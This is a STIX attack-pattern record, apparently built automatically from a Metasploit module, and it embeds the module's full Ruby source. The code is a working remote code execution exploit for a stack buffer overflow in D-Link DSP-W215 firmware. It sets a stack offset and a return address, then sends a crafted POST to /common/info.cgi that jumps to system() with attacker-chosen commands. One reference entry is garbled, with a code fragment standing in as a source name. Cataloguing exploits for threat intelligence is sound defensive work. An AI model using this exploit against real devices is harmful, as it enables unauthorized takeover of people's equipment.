{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ef7b2bbb-7a2c-4022-8694-63083c5c268d",
    "created": "2024-08-14T17:02:22.627729Z",
    "modified": "2024-08-14T17:02:22.627734Z",
    "name": "D-Link info.cgi POST Request Buffer Overflow",
    "description": " This module exploits an anonymous remote code execution vulnerability on different D-Link devices. The vulnerability is a stack based buffer overflow in the my_cgi.cgi component when handling specially crafted POST HTTP requests addresses to the /common/info.cgi handler. This module has been successfully tested on D-Link DSP-W215 in an emulated environment. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_dspw215_info_cgi_bof.rb",
            "external_id": "dlink_dspw215_info_cgi_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.devttys0.com/2014/05/hacking-the-dspw215-again/#blogpostfromCraigincludingPoC"
        },
        {
            "source_name": "fail_with(Failure::NoTarget",
            "external_id": "\"#{peer}-FailedtoaccessthevulnerableURL\")"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'D-Link info.cgi POST Request Buffer Overflow',\n      'Description'    => %q{\n        This module exploits an anonymous remote code execution vulnerability on different D-Link\n        devices. The vulnerability is a stack based buffer overflow in the my_cgi.cgi component,\n        when handling specially crafted POST HTTP requests addresses to the /common/info.cgi\n        handler. This module has been successfully tested on D-Link DSP-W215 in an emulated\n        environment.\n      },\n      'Author'         =>\n        [\n          'Craig Heffner',   # vulnerability discovery and initial PoC\n          'Michael Messner <devnull[at]s3cur1ty.de>', # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_MIPSBE,\n      'References'     =>\n        [\n          ['OSVDB', '108249'],\n          ['URL', 'http://www.devttys0.com/2014/05/hacking-the-dspw215-again/'] # blog post from Craig including PoC\n        ],\n      'Targets'        =>\n        [\n          #\n          # Automatic targeting via fingerprinting\n          #\n          [ 'Automatic Targeting', { 'auto' => true }  ],\n          [ 'D-Link DSP-W215 - v1.02',\n            {\n              'Offset' => 477472,\n              'Ret'    => 0x405cec # jump to system - my_cgi.cgi\n            }\n          ]\n        ],\n      'DisclosureDate' => '2014-05-22',\n      'DefaultTarget' => 0))\n\n    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri' => \"/common/info.cgi\",\n        'method'  => 'GET'\n      })\n\n      if res && [200, 301, 302].include?(res.code)\n        if res.body =~ /DSP-W215A1/ && res.body =~ /1.02/\n          @my_target = targets[1] if target['auto']\n          return Exploit::CheckCode::Appears\n        end\n\n        return Exploit::CheckCode::Detected\n      end\n\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Trying to access the vulnerable URL...\")\n\n    @my_target = target\n    check_code = check\n\n    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to access the vulnerable URL\")\n    end\n\n    if @my_target.nil? || @my_target['auto']\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to auto detect, try setting a manual target...\")\n    end\n\n    print_status(\"Exploiting #{@my_target.name}...\")\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 185\n    )\n  end\n\n  def prepare_shellcode(cmd)\n    buf = rand_text_alpha_upper(@my_target['Offset'])   # Stack filler\n    buf << [@my_target.ret].pack(\"N\")                   # Overwrite $ra -> jump to system\n\n           # la $t9, system\n           # la $s1, 0x440000\n           # jalr $t9 ; system\n           # addiu $a0, $sp, 0x28 # our command\n\n    buf << rand_text_alpha_upper(40)                # Command to execute must be at $sp+0x28\n    buf << cmd                                      # Command to execute\n    buf << \"\\x00\"                                   # NULL terminate the command\n  end\n\n  def execute_command(cmd, opts)\n    shellcode = prepare_shellcode(cmd)\n\n    begin\n      res = send_request_cgi({\n        'method'        => 'POST',\n        'uri'           => \"/common/info.cgi\",\n        'encode_params' => false,\n        'vars_post'     => {\n          'storage_path' => shellcode,\n        }\n      }, 5)\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-05-22",
    "x_mitre_platforms": [
        "linux'"
    ]
}